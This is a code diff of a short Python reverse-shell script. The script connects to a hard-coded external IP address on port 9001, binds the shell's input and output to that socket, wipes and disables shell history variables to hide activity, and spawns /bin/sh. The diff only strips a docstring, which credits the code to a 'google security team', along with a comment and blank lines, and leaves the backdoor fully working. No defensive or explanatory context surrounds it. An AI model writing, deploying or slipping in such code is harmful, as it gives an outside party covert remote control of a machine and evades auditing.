@@ -1,14 +1,10 @@
 # -*- coding:utf-8 -*-
 #!/usr/bin/env python
-"""
-back connect py version,only linux have pty module
-code by google security team
-"""
+
 import os,socket,pty,time
 shell = "/bin/sh"
 
 def main():
-
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	try:
 		s.connect(('106.13.59.8',9001))
@@ -18,7 +14,6 @@ def main():
 	os.dup2(s.fileno(),0)
 	os.dup2(s.fileno(),1)
 	os.dup2(s.fileno(),2)
-#	global shell
 	os.unsetenv("HISTFILE")
 	os.unsetenv("HISTFILESIZE")
 	os.unsetenv("HISTSIZE")
@@ -32,8 +27,6 @@ def main():
 	os.putenv("HISTFILESIZE",'0')
 	pty.spawn(shell)
 	s.close()
-
-
 if __name__ == '__main__':
     main()
 		
